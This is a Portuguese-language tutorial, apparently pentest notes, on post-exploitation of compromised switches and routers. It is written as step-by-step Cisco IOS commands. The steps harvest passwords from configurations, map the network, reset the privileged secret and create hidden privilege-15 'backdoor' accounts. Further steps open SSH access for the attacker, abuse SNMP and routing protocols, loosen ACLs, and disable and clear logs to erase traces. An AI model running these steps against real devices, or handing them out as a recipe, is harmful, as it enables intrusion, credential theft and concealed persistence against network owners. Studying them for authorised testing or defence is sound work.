# Técnicas de Pós-Exploração para Switches e Roteadores

### Coleta de Informações Sensíveis

Uma das primeiras ações pós-exploração é **extrair informações valiosas** do dispositivo comprometido, que podem ser usadas para explorar ainda mais a rede.

#### Comandos úteis:
- **Configurações de Senhas**: Verifique se há senhas armazenadas em texto claro ou mal protegidas.
  ```
  show running-config | include password
  show running-config | include secret
  ```
  - **Objetivo**: Capturar senhas de usuários ou senhas administrativas.

- **Tabelas de Roteamento**: Coletar informações sobre rotas para descobrir outros segmentos de rede.
  ```
  show ip route
  show ipv6 route
  ```

- **Tabela ARP**: Descubra dispositivos conectados ao switch ou roteador comprometido.
  ```
  show arp
  ```

- **CDP/LLDP (Cisco Discovery Protocol/Link Layer Discovery Protocol)**: Descubra dispositivos Cisco ou outros dispositivos adjacentes conectados ao switch/roteador.
  ```
  show cdp neighbor detail
  ```

- **Logs do Sistema**: Verifique se há registros de atividades passadas ou informações que possam ser valiosas.
  ```
  show logging
  ```

Essas informações podem ser usadas para identificar novos alvos, entender o layout da rede e obter credenciais que permitem movimentos laterais.


### Escalonamento de Privilégios

Se o acesso obtido ao dispositivo for limitado, é essencial **escalar privilégios** para garantir controle total.

- **Resetar a Senha Privilegiada**: Caso você tenha acesso ao modo de configuração, é possível redefinir a senha do modo EXEC privilegiado.
  ```
  enable secret <nova_senha>
  ```

- **Criar Contas de Administrador Ocultas**: Um atacante pode criar usuários adicionais com privilégios administrativos para manter o controle do dispositivo.
  ```
  username <nome_usuario> privilege 15 secret <senha>
  ```

- **Alterar Configurações de Acesso**: Modifique as linhas VTY (Telnet/SSH) para garantir que as conexões remotas sejam possíveis e seguras para o atacante.
  ```
  line vty 0 4
  password <senha_nova>
  transport input ssh
  ```

### Movimentação Lateral

Após comprometer um switch ou roteador, o próximo passo é **explorar outros dispositivos** na rede.

- **VLAN Hopping**: Se o switch estiver mal configurado, é possível fazer "VLAN hopping", permitindo que um invasor mova-se entre diferentes VLANs.
  - Verifique as VLANs configuradas:
    ```
    show vlan brief
    ```
  - Ataques de VLAN hopping exploram a falta de segurança entre VLANs para acessar segmentos de rede que normalmente estariam isolados.

- **SNMP Exploitation**: Se o protocolo SNMP estiver habilitado e mal configurado, o invasor pode usá-lo para controlar outros dispositivos ou roubar informações sensíveis.
  ```
  show running-config | include snmp
  ```
  - **String de comunidade** mal configurada (como "public") pode ser explorada para obter controle ou informações.

- **Exposição de Roteamento Dinâmico**: Se protocolos de roteamento dinâmico como **OSPF** ou **EIGRP** estiverem habilitados, o invasor pode injetar rotas falsas ou alterar as tabelas de roteamento.
  - Verifique protocolos de roteamento:
    ```
    show ip protocols
    ```

### Manutenção de Acesso Persistente

Após obter acesso, o invasor tentará garantir que esse acesso seja mantido sem ser detectado.

- **Backdoor SSH**: Configure acesso SSH persistente com contas administrativas ocultas.
  ```
  username backdoor privilege 15 secret <senha_secreta>
  line vty 0 4
  transport input ssh
  ```

- **Modificação das ACLs (Access Control Lists)**: Altere ou crie novas listas de controle de acesso que permitam tráfego privilegiado, sem levantar suspeitas.
  ```
  access-list 100 permit ip <origem> <destino>
  ```

- **Desabilitar Logs**: Desativar ou limpar logs pode ajudar a esconder a presença do invasor.
  ```
  no logging console
  clear logging
  ```

### Limpeza de Rastros

Para evitar detecção, o invasor deve **limpar evidências** da sua presença no sistema.

- **Apagar Logs de Sistema**: Limpar logs de atividades que podem alertar administradores sobre a invasão.
  ```
  clear logging
  ```

- **Remover Contas de Backdoor ao Sair**: Remover contas criadas temporariamente pode ajudar a esconder vestígios da exploração.
  ```
  no username backdoor
  ```

- **Desabilitar Depuração**: Se a depuração foi usada para monitorar atividades, ela deve ser desativada.
  ```
  undebug all
  ```
